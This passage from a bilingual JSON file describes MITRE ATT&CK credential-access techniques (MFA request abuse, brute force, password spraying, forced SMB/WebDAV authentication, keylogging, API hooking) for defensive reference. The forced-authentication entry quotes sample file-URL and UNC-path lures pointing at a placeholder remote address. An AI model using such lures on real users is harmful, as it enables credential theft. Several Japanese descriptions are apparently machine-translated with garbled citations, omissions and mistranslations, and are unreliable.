                "description_jp": "攻撃者は、ユーザーに送信される MFA リクエストを生成することで、多要素認証（MFA）メカニズムを迂回し、アカウントへのアクセスを試みる可能性がある。\n\n有効なアカウント](https://attack.mitre.org/techniques/T1078)へのクレデンシャルを所持している敵対者は、追加のクレデンシャルとセキュリ ティコントロールとして必要な 2FA または MFA メカニズムへのアクセスがない場合、ログインプロセスを完 了することができないかもしれない。これを回避するために、敵対者は Duo Push、Microsoft Authenticator、Okta などの MFA サービスへのプッシュ通知の自動生成を悪用し、ユーザーにアカウントへのアクセスを許可させる可能性がある。敵対者が被害者アカウントの認証情報を持たない場合、このオプションがセルフサービス・パスワード・リセット（SSPR）に設定されているときに、自動プッシュ通知生成を悪用する可能性もある（引用：Obsidian SSPR Abuse 2023）。\n\n場合によっては、敵対者は MFA プッシュ通知、SMS メッセージ、および電話でユーザーを混乱させるためにログイン試行を継続的に繰り返し、「MFA 疲労」に応じてユーザーが最終的に認証要求を受け入れる結果になる可能性があります（引用：Russian 2FA Push Annoyance - Cimpanu）（引用：MFA Fatigue Attacks - PortSwigger）（引用：Russian 2FA Push Annoyance - Cimpanu）（引用：MFA Fatigue Attacks - PortSwigger）：世界中の政府機関および企業体を標的としたロシアの活動の疑い)",
                "subtechniques": []
            },
            {
                "id": "T1212",
                "name_eng": "Exploitation for Credential Access",
                "name_jp": "クレデンシャル・アクセスの悪用",
                "description_eng": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. \n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "description_jp": "敵は、クレデンシャルを収集しようとしてソフトウェアの脆弱性を悪用することがある。ソフトウェアの脆弱性の悪用は、敵対者がプログラム、サービス、またはオペレーティング・システム・ソフト ウェアやカーネル自体のプログラミング・エラーを利用して、敵対者が制御するコードを実行する場 合に発生する。\n\nクレデンシャルおよび認証メカニズムは、有用なクレデンシャルにアクセスする手段、または認証されたシステムにアクセスするプロセスを迂回する手段として、敵が悪用の標的にする可能性がある。その一例が `MS14-068` であり、これは Kerberos を標的としており、ドメイン・ユーザー権限を使用して Kerberos チケットを偽造するために使用することができる(引用：Technet MS14-068)(引用：ADSecurity Detecting Forged Tickets)。このもう一つの例がリプレイ攻撃であり、これは敵対者が当事者間で送信されたデータ・パケットを傍受し、後でこれらのパケットを再生するものである。サービスが認証要求を適切に検証しない場合、これらのリプレイされたパケットによって、敵対者が当事者の1人になりすまし、不正なアクセスや特権を得ることができる可能性がある（引用：Bugcrowdリプレイ攻撃）（引用：Comparitechリプレイ攻撃）（引用：Microsoft Midnight Blizzardリプレイ攻撃）。\n\nこのような悪用はクラウド環境でも実証されている。例えば、敵対者は、意図しない認証トークンの作成と更新を可能にするパブリッククラウドインフラストラクチャの脆弱性を悪用している(引用：Storm-0558による不正メールアクセスのテクニック)。\n\nクレデンシャル・アクセスのための悪用は、標的とされたプロセスや取得されたクレデンシャルによっては、特権の昇格につながる可能性もある。",
                "subtechniques": []
            },
            {
                "id": "T1110",
                "name_eng": "Brute Force",
                "name_jp": "ブルート・フォース",
                "description_eng": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",
                "description_jp": "(引用: TrendMicro Pawn Storm Dec 2020) アカウントまたは一連のアカウントのパスワードに関する知識がない場合、敵対者は反復的または反復的なメカニズムを使用してパスワードを体系的に推測することができます。(引用: Dragos Crashoverride 2018) ブルートフォースパスワードは、パスワードハッシュなどの以前に取得したクレデンシャルデータに対して、それらのクレデンシャルの有効性またはオフラインをチェックするサービスとの相互作用を介して行われる可能性があります。\n\nクレデンシャルのブルートフォースは、侵害中のさまざまな時点で行われる可能性がある。例えば、敵対者は[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)、[Account Discovery](https://attack.mitre.org/techniques/T1087)、[Password Policy Discovery](https://attack.mitre.org/techniques/T1201)などの侵害後の行動から収集した知識を活用して、被害者環境内の[Valid Accounts](https://attack.mitre.org/techniques/T1078)へのブルートフォースアクセスを試みることがある。攻撃者はまた、ブルートフォース行為を初期アクセスの一部として[外部リモートサービス](https://attack.mitre.org/techniques/T1133)などの行為と組み合わせることもある。",
                "subtechniques": [
                    {
                        "id": "T1110.004",
                        "name_eng": "Credential Stuffing",
                        "name_jp": "クレデンシャル・スタッフィング",
                        "description_eng": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",
                        "description_jp": "攻撃者は、クレデンシャルの重複によってターゲット・アカウントにアクセスするために、無関係なアカウントの侵害ダンプから得たクレデンシャルを使用することがある。時折、ウェブサイトやサービスが侵害され、ユーザ・アカウントのクレデンシャルにアクセスされると、大量の ユーザ名とパスワードのペアがオンラインにダンプされる。この情報は、ユーザが個人アカウントとビジネス・アカウントで同じパスワードを使用する傾向を利用して、アカウントの侵害を試みる敵対者にとって有用である可能性があります。\n\nクレデンシャル・スタッフィングは、組織のログイン失敗ポリシーによっては、多数の認証失敗やアカウントのロックアウトを引き起こす可能性があるため、リスクの高いオプションです。\n\n通常、クレデンシャルのスタッフィングには、一般的に使用されているポート上の管理サービスが使用されます。一般的に標的とされるサービスは以下のとおりです：\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* ldap (389/TCP)\n* ケルベロス（88/TCP）\n* RDP / ターミナルサービス (3389/TCP)\n* HTTP/HTTP 管理サービス (80/TCP & 443/TCP)\n* mssql (1433/tcp)\n* オラクル（1521/TCP）\n* MySQL (3306/TCP)\n* vnc (5900/tcp)\n\n管理サービスに加え、敵対者は「シングルサインオン(SSO)や連携認証プロトコルを利用するクラウドベースのアプリケーション、またOffice 365のような外部向けの電子メールアプリケーションを標的にする」可能性がある(引用：US-CERT TA18-068A 2018)"
                    },
                    {
                        "id": "T1110.002",
                        "name_eng": "Password Cracking",
                        "name_jp": "パスワード・クラッキング",
                        "description_eng": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
                        "description_jp": "逆境者は、パスワードハッシュのようなクレデンシャル資料が得られると、平文パスワードのような使用可能なクレデンシャルを回復するためにパスワードクラッキングを使用するかもしれない。[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)を使用してパスワードハッシュを取得することができるが、これは[Pass the Hash](https://attack.mitre.org/techniques/T1550/002)がオプションでない場合にのみ敵対者に有効である。さらに、敵対者は、ネットワークデバイスのハッシュ化されたクレデンシャルを取得するために、[構成リポジトリからのデータ](https://attack.mitre.org/techniques/T1602)を活用する可能性がある(引用：US-CERT-TA18-106A)。\n\nハッシュを計算するために使用されるパスワードを系統的に推測する技術が利用可能であり、あるいは敵対者はハッシュをクラックするために事前に計算されたレインボーテーブルを使用するかもしれない。ハッシュのクラックは通常、標的ネットワークの外部にある敵の制御するシステム上で行われる。 引用：Wikipedia パスワードのクラック）ハッシュのクラックに成功した結果得られる平文のパスワードは、そのアカウントがアクセスできるシステム、リソース、サービスにログインするために使用される可能性がある。"
                    },
                    {
                        "id": "T1110.001",
                        "name_eng": "Password Guessing",
                        "name_jp": "パスワード当て",
                        "description_eng": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                        "description_jp": "システムまたは環境内の正当なクレデンシャルについて事前の知識がない敵対者は、アカウントへのア クセスを試みるためにパスワードを推測する可能性がある。アカウントのパスワードの知識がない場合、敵対者は反復的または反復的なメカニズムを使って組織的にパスワードを推測することを選ぶかもしれない。敵対者は、一般的なパスワードのリストを使用することで、操作中にシステムまたは環境のパスワードを事前に知ることなくログイン認証情報を推測する可能性がある。パスワードの推測は、パスワードの複雑さに関するターゲットのポリシーを考慮に入れるか、試行が何度も失敗した後にア カウントをロックアウトするポリシーを使用するかは問わない。\n\nパスワードの推測は、組織のログイン失敗ポリシーによっては、多数の認証失敗やアカウントのロックアウトを引き起こす可能性があるため、リスクの高いオプションとなり得る。(引用：Cylance Cleaver）\n\n通常、パスワードの推測には、一般的に使用されているポート上の管理サービスが使用される。よく狙われるサービスには以下のようなものがある：\n\n* SSH（22/TCP）\n* テルネット（23/TCP）\n* FTP（21/TCP）。\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* ldap (389/TCP)\n* ケルベロス（88/TCP）\n* RDP / ターミナルサービス (3389/TCP)\n* HTTP/HTTP 管理サービス (80/TCP & 443/TCP)\n* mssql (1433/tcp)\n* オラクル（1521/TCP）\n* MySQL (3306/TCP)\n* vnc (5900/tcp)\n* SNMP (161/UDP および 162/TCP/UDP)\n\n管理サービスに加え、敵対者は「シングルサインオン(SSO)や連携認証プロトコルを利用するクラウドベースのアプリケーション、さらにはOffice 365のような外部向けの電子メールアプリケーションを標的にする」可能性がある(引用：US-CERT TA18-068A 2018)。さらに、敵対者はネットワークデバイスインタフェース(`wlanAPI`など)を悪用して、無線認証プロトコルを介してアクセス可能な無線ルーターを総当たりで攻撃する可能性があります(引用: Trend Micro Emotet 2020)。\n\nデフォルトの環境では、LDAPとKerberosの接続試行がSMB経由でイベントをトリガーする可能性は低く、Windowsの「ログオンの失敗」イベントID 4625が作成されます。"
                    },
                    {
                        "id": "T1110.003",
                        "name_eng": "Password Spraying",
                        "name_jp": "パスワード・スプレー",
                        "description_eng": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                        "description_jp": "攻撃者は、有効なアカウント認証情報を取得するために、多くの異なるアカウントに対して単一または少 数のよく使われるパスワードのリストを使うかもしれない。パスワード スプレーは1つのパスワード(例えば'Password01')、またはドメインの複雑さポリシーに一致する、よく使われるパスワードの小さなリストを使用する。多くのパスワードで1つのアカウントをブルートフォースする際に通常発生するアカウントのロックアウトを回避するために、ネットワーク上の多くの異なるアカウントに対してそのパスワードでログインを試みます。(引用：BlackHillsInfosec Password Spraying)\n\n通常、パスワード・スプレーを行う際には、一般的に使用されているポート上の管理サービスが使用される。一般的に狙われるサービスは以下の通りです：\n\n* SSH (22/TCP)\n* テルネット（23/TCP）\n* FTP（21/TCP）。\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* ldap (389/TCP)\n* ケルベロス（88/TCP）\n* RDP / ターミナルサービス (3389/TCP)\n* HTTP/HTTP 管理サービス (80/TCP & 443/TCP)\n* mssql (1433/tcp)\n* オラクル（1521/TCP）\n* MySQL (3306/TCP)\n* vnc (5900/tcp)\n\n管理サービスに加え、敵対者は「シングルサインオン(SSO)や連携認証プロトコルを利用するクラウドベースのアプリケーション、またOffice 365のような外部向けの電子メールアプリケーションを標的にする」可能性がある(引用：US-CERT TA18-068A 2018)\n\nデフォルトの環境では、LDAP および Kerberos 接続の試行が SMB を介してイベントをトリガーする可能性は低く、Windows の「ログオンの失敗」イベント ID 4625 が作成されます。"
                    }
                ]
            },
            {
                "id": "T1187",
                "name_eng": "Forced Authentication",
                "name_jp": "強制認証",
                "description_eng": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
                "description_jp": "攻撃者は、傍受可能なメカニズムを通じて、認証情報を自動的に提供するようにユーザを 呼び出すか強制することによって、クレデンシャル情報を収集することができる。\n\nサーバー・メッセージ・ブロック(SMB)プロトコルは、リソースへのアクセスやファイル共有のための認証やシステム間の通信のために、Windowsネットワークで一般的に使用されている。WindowsシステムがSMBリソースに接続しようとすると、自動的に認証を試み、現在のユーザーの認証情報をリモートシステムに送信する。(引用: Wikipedia Server Message Block) この動作は、ユーザーがネットワークリソースにアクセスするために認証情報を入力する必要がないように、企業環境では典型的である。\n\nWebDAV（Web Distributed Authoring and Versioning）もまた、SMBがブロックされたり失敗したりした場合のバックアッププロトコルとして、Windowsシステムで一般的に使用されている。WebDAVはHTTPの拡張であり、通常TCPポート80と443で動作する。(引用：Didier Stevens WebDAV Traffic） （引用：Microsoft Managing WebDAV Security）\n\n攻撃者はこの動作を利用して、強制的なSMB/WebDAV認証によってユーザーアカウントのハッシュにアクセスする可能性があります。敵対者は、スピアフィッシングを通じて、敵対者が管理する外部サーバへのリソースリンクを含む添付ファイルをユーザに送信したり(すなわち、[テンプレートインジェクション](https://attack.mitre.org/techniques/T1221))、特権アカウントのナビゲーションパス上に特別に細工したファイルを置いたり(例えば、デスクトップ上に置かれた.SCFファイル)、被害者がアクセスできるように一般にアクセス可能な共有上に置いたりすることができます。ユーザーのシステムが信頼されていないリソースにアクセスすると、認証が試みられ、ユーザーのハッシュ化された認証情報を含む情報がSMB経由で敵のコントロールするサーバーに送信されます。(引用：GitHub Hashjacking) クレデンシャル・ハッシュにアクセスすることで、敵はオフラインで[Brute Force](https://attack.mitre.org/techniques/T1110)クラッキングを実行し、平文のクレデンシャルにアクセスできるようになります。(引用：Cylance Redirect to SMB)\n\nこれにはいくつかの異なる方法がある。(引用：Osanda Stealing NetNTLM Hashes) 実際に使用されている例としては、以下のようなものがある：\n\n* スピアフィッシングの添付ファイルには、ドキュメントを開いたときに自動的に読み込まれるリソースが含まれている(つまり、[テンプレート・インジェクション](https://attack.mitre.org/techniques/T1221))。この文書には、例えば<code>file[:]//[リモートアドレス]/Normal.dotm<//code>のようなSMBリクエストをトリガーするリクエストを含めることができます。(引用：US-CERT APT Energy Oct 2017）\n* アイコンのファイル名が<code>[リモートアドレス]◆pic.png</code>のような外部参照を指している修正された.LNKまたは.SCFファイルは、認証情報を繰り返し収集するためにアイコンがレンダリングされるときにシステムにリソースをロードさせます。(引用：US-CERT APT Energy Oct 2017）",
                "subtechniques": []
            },
            {
                "id": "T1056",
                "name_eng": "Input Capture",
                "name_jp": "入力キャプチャ",
                "description_eng": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
                "description_jp": "攻撃者は、クレデンシャルを取得したり情報を収集したりするために、ユーザ入力をキャプチャする方法を使用する可能性がある。通常のシステム使用中、ユーザはログインページ/ポータルやシステムダイアログボックスなど、さまざまな異なる場所にクレデンシャルを提供することが多い。入力キャプチャメカニズムは、ユーザに対して透過的である場合（[Credential API Hooking](https://attack.mitre.org/techniques/T1056/004) など）と、ユーザを欺いて本物のサービスであると思わせる入力に依存する場合（[Web Portal Capture](https://attack.mitre.org/techniques/T1056/003) など）がある。",
                "subtechniques": [
                    {
                        "id": "T1056.001",
                        "name_eng": "Keylogging",
                        "name_jp": "キーロギング",
                        "description_eng": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "敵対者は、ユーザが入力するクレデンシャルを傍受するために、ユーザのキーストロークを記録することがある。キーロギングは、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)の取り組みが効果的でない場合に、新たなアクセス機会のためにクレデンシャルを取得するために使用される可能性が高く、クレデンシャルをうまくキャプチャできるようになるまでに、敵対者がシステム上のキーストロークをかなりの期間傍受する必要がある場合がある。クレデンシャルを迅速に取得する可能性を高めるために、敵対者はブラウザのクッキーをクリアするなどのアクションを実行し、ユーザーにシステムに対する再認証を強制することもあります（引用：Talos Kimsuky Nov 2021）。\n\nキーロギングは、入力キャプチャの最も一般的なタイプであり、キー入力を傍受するさまざまな方法がある(引用: Adventures of a Keystroke)：\n\n* キー入力を処理するAPIコールバックをフックする。Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)とは異なり、これはキーストロークのデータを処理するためのAPI機能のみに焦点を当てている。\n* ハードウェア・バッファからの生のキーストローク・データの読み取り。\n* Windowsレジストリの変更。\n* カスタムドライバー。\n* システム・イメージの修正](https://attack.mitre.org/techniques/T1601)は、ログイン・セッションのための生のキーストロークを読み取るために、ネットワーク・デバイスのオペレーティング・システムへのフックを敵対者に提供する可能性がある(引用: Cisco Blog Legacy Device Attacks)。"
                    },
                    {
                        "id": "T1056.002",
                        "name_eng": "GUI Input Capture",
                        "name_jp": "GUI入力キャプチャ",
                        "description_eng": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                        "description_jp": "攻撃者は、一般的なオペレーティング・システムの GUI コンポーネントを模倣して、一見正当なプロンプトでユーザに認証情報を要求することがある。現在のユーザー・コンテキストに存在する以上の特権を必要とするプログラムが実行されると、オペレーティング・システムは、タスクのための昇格特権を承認するための適切な認証情報をユーザーに求めるプロンプトを表示するのが一般的です（例：[Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)）。\n\n攻撃者はこの機能を模倣し、追加アクセスを要求する偽のインストーラや偽のマルウェア除去スイートなど、通常の使用方法を模倣したさまざまな理由で、一見正当なプロンプトを表示してユーザに認証情報を要求することがあります。(引用：OSX Malware Exploits MacKeeper）この種のプロンプトは、[AppleScript](https://attack.mitre.org/techniques/T1059/002)(引用：LogRhythm Do You Trust Oct 2014)(引用：OSX Keydnap malware)(引用：Spoofing credential dialogs)や[PowerShell](https://attack.mitre.org/techniques/T1059/001）。（引用：LogRhythm Do You Trust Oct 2014）（引用：Enigma Phishing for Credentials Jan 2015）（引用：Spoofing credential dialogs）Linuxシステムにおいて、敵対者は悪意のあるシェルスクリプトまたはコマンドライン（すなわち[Unix Shell](https://attack.mitre.org/techniques/T1059/004)）から、ユーザーに認証情報を求めるダイアログボックスを起動する可能性があります。（引用：Spoofing credential dialogs）\n\n攻撃者はまた、ブラウザや電子メールクライアントからのものなど、一般的なソフトウェア認証要求を模倣することもある。これは、ユーザが機密性の高いサイト/データに自然にアクセスしているときにプロンプトを偽装するために、ユーザ・アクティビティ・モニタリング（すなわち、[ブラウザ情報ディスカバリ](https://attack.mitre.org/techniques/T1217)および/または[アプリケーション・ウィンドウ・ディスカバリ](https://attack.mitre.org/techniques/T1010)）と組み合わせることもできる。"
                    },
                    {
                        "id": "T1056.004",
                        "name_eng": "Credential API Hooking",
                        "name_jp": "クレデンシャルAPIフック",
                        "description_eng": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. \n\nIn Windows, hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nIn Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)",
